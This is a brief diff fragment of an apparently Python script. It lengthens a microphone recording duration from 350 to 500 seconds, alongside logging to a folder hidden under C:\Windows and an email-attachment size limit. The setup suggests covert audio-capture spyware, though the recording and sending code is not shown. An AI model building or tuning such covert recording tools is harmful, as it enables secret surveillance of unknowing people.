@@ -12,7 +12,7 @@ log_directory = "C:\\Windows\\klm\\logs"
 os.makedirs(output_directory, exist_ok=True)
 os.makedirs(log_directory, exist_ok=True)
 logging.basicConfig(filename=os.path.join(log_directory, 'file_generation.log'), level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
-MICROPHONE_DURATION = 350  # Duration of recording in seconds
+MICROPHONE_DURATION = 500  # Duration of recording in seconds
 MAX_ATTACHMENT_SIZE = 3 * 1024 * 1024  # Max size for an attachment
 
 def record_audio():
